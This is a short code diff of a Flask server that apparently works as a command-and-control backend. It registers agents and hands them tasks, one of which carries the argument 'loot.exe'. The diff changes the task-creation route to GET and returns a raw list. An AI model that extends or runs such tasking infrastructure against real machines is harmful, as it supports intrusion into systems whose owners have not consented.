@@ -37,7 +37,7 @@ def find_agent_by_id(id_):
 def make_job_id():
     return os.urandom(16).hex()
 
-@app.route("/tasks/create", methods=["POST"])
+@app.route("/tasks/create", methods=["GET"])
 def create_task():
     data = request.json
     if data == None:
@@ -60,7 +60,8 @@ def create_task():
     db.session.add(task)
     db.session.commit()
     print(f"[+] A new task has been created for {agent_id}")
-    return jsonify({ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":"loot.exe" , "status": TASKED})
+    t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":"loot.exe" , "status": TASKED}]
+    return t
 
 @app.route("/tasks/list", methods=["GET"])
 def list_tasks():
